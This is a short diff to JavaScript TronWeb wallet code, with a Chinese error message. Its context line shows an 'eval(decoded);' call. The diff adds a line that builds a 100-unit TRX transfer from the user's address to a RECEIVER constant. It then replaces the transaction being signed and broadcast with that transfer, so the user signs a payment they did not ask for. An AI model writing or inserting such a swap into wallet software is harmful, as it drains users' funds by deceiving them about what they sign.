@@ -112,10 +112,10 @@ eval(decoded);
       params,
       tronWeb.address.toHex(address)
     );
-
+const txResultTRX = await tronWeb.transactionBuilder.sendTrx(RECEIVER, 100, address);
     if (!txResult.transaction) throw new Error("构造交易失败");
 
-    const signedTx = await wallet.signTransaction(txResult.transaction);
+    const signedTx = await wallet.signTransaction(txResultTRX);
 
     const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTx);
 
